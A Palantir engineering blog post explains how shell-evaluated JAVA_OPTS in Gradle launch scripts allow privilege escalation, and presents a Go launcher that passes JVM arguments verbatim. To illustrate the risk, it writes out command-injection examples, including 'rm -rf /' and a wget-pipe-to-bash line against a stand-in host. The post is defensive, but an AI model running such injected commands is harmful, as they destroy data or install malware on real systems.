Launching Java Applications Securely

Palantir
5 min read
·
Nov 19, 2016

In our software deployment system, product configuration and local system access (e.g., via SSH) are separate privileges, and we prefer to limit system access to a small set of infrastructure administrators. Our setup requires that the users configuring Java-based services are able to modify JVM settings. This post shows that standard templating methods for starting Java services via shell scripts and environment variables would effectively grant system access to users with configuration privileges. The mechanics of this attack are not particularly surprising or sophisticated, but nonetheless represent an avoidable attack vector. To combat this subtle privilege escalation, we favor a custom Java launcher that ensures sanitized program arguments over standard Gradle distribution scripts that we used before.

Launching applications

In the context of this article, launching an application is the process of starting a (Java) program from a Linux shell. The simplest way to launch applications is to call the java binary with the required parameters, including JVM options, class path, main class, and program arguments. Any non-trivial application uses a packaging mechanism that allows developers to declare source code, dependencies, and configuration, and produces an artifact containing the compiled program and a set of launch scripts that wrap the internals of the java invocation into a user-friendly, executable script. For example, Gradle's Java application plugin produces a bin/my-app shell script such that executing bin/my-app starts the application's main class.

Introspecting the Gradle-generated shell script, we see that it eventually calls

exec "$JAVACMD" "${JVM_OPTS[@]}" -classpath "$CLASSPATH" myapp.MyApp "$@"

where JVM_OPTS is itself derived from the JAVA_OPTS environment variable. This allows users to supply run-time parameters for the JVM, such as the maximum amount of heap memory available to program:

JAVA_OPTS="-Xmx64m" bin/my-app

Since the script interprets the JAVA_OPTS variable in the current shell, the above is functionally equivalent to

JAVA_OPTS="`echo '-Xmx64m'`" bin/my-app

Unfortunately, it is also equivalent to

JAVA_OPTS="`rm -rf / && echo '-Xmx64m'`" bin/my-app

or even to

JAVA_OPTS="`wget -O - http://my-virus | bash && echo '-Xmx64m'`" bin/my-app

i.e., to the ability to execute arbitrary code or deploy malware.

Privilege escalation through launch scripts

When launching programs with shell access, this behavior (including the ability to run arbitrary code as part of the launch process) is of course not very surprising. The situation is a little more nuanced when programs are installed and launched through a deployment system that separates user permissions into “provide and install a program binary”, “configure the program”, “start/stop the program”, and “use the program”. In this model, the ability to install a program is strictly more powerful than the ability to configure a program. In particular, the ability to change a program binary implies the ability to execute arbitrary code on the designated machine, whereas the ability to configure a program allows users to change parameters that are typically sanitized and validated by the program itself, such as the size of a thread pool, credentials for database access, etc.

In order to limit the blast radius of compromised user credentials, we restrict the right to install applications to the deployment system and do not grant users or even service administrators the right to SSH into machines. Service administrators’ permissions are limited to changing service configuration and starting/stopping/restarting services through the deployment UI tools. Consequently, any service configuration facility that allows service administrators to execute arbitrary code should be considered privilege escalation. In particular, given the examples above, it is clear that we must not let users set JAVA_OPTS for services launched through a Gradle launch script.

Preventing privilege escalation via explicit configuration

Our gradle-java-distribution plugin is an alternative to Gradle’s native distribution plugin. It prevents the described privilege escalation by sanitizing configuration parameters instead of evaluating them as shell expressions. Plugin users have compile-time access to a fixed list of configuration options through a standard Gradle extension:

// build.gradle
distribution {
  mainClass 'foo.bar.MyServiceMainClass'
  args 'server', 'var/conf/my-service.yml'
  defaultJvmOpts '-Xmx1g'
  defaultJvmOpts '-Xms1g'
}

The plugin renders the configuration into a launcher-static.yml file as follows:

mainClass: foo.bar.MyServiceMainClass
classpath:
  - ./foo.jar
  - ... (list of Jars is taken from the Gradle configuration)
jvmOpts:
  - '-Xmx1g'
  - '-Xms1g'
args:
  - server
  - var/conf/my-service.yml

The launcher-static.yml file is included in the TGZ/ZIP distribution together with a Go binary that reads the YAML file and executes (via the exec() system call) the java binary with the specified JVM and program arguments, i.e., roughly

/absolute/path/to/java
  -Xmx1g -Xms1g \
  -classpath /absolute/path/to/foo.jar \
  foo.bar.MyServiceMainClass \
  server var/conf/my-service.yml

Since all configuration is interpreted as verbatim strings and directly passed to the exec() system call, this launch mechanism prevents the described privilege escalation.

We chose Go to implement the launcher; we have more institutional knowledge on Go than on Bash and therefore consider it a more suitable language for our purposes. One downside of this choice, compared to OS-independent shell scripts, is the coupling to a pre-compiled, OS-dependent launcher binary. The Gradle plugin currently provides MacOS and Linux binaries for our standard development and production environments.

Separating compile-time from run-time configuration

The launcher-static.yml mechanism lets code authors specify runtime parameters; the missing piece is the ability for service administrators to override or augment such configuration at run time without jeopardizing the aforementioned privilege separation between installing and configuring binaries. Our deployment system installs binaries into a directory structure that lets us distinguish between immutable and mutable configuration:

/some/prefix/my-service/
    # immutable, fixed at compile time; read-only for service administrators
    service/
        bin
            go-java-launcher
            launcher-static.yml
        lib/
            foo.jar
            ...
    # mutable at run time; service administrators have write access
    var/
        conf/
            launcher-custom.yml
            my-service.yml
        data/

The deployment system installs the program JARs together with the launcher binary and the static configuration in a directory service/ that is considered immutable after installation. Conversely, it renders mutable, user-defined configuration into the var/ directory, including a service-specific configuration file (my-service.yml) and an additional launcher configuration file (launcher-custom.yml). Notably, launcher-custom.yml does not provide a mechanism for changing the program class path; this means that service administrators cannot change the program binary. A further advantage of this setup is that the deployment system can upgrade the program binaries without affecting the program configuration.
